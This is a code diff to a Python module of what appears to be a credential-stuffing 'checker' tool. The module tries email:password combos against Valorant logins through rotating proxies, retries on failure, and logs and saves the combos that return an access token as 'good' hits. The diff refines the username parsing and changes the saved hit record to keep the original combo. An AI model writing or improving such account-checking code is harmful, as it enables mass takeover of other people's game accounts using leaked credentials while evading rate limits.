@@ -3,8 +3,7 @@ from requests import Session
 from modules.functions import bad_proxy, log,save,set_proxy
 
 def check(email:str,password:str):
-    if "@" in email:
-        username = email.split("@")[0]
+    username = email.split("@")[0] if "@" in email else email
     retries = 0
     while retries != checker.retries:
         proxy = set_proxy()
@@ -26,7 +25,7 @@ def check(email:str,password:str):
                 elif "access_token" in response:
                     if not checker.cui:
                         log("good",username+":"+password,"Valorant")
-                    save("Valorant","good",checker.time,username+":"+password+f" | Email: {email}")
+                    save("Valorant","good",checker.time,username+":"+password+f" | Original Combo: {email}:{password}")
                     checker.good += 1
                     checker.cpm += 1
                     return
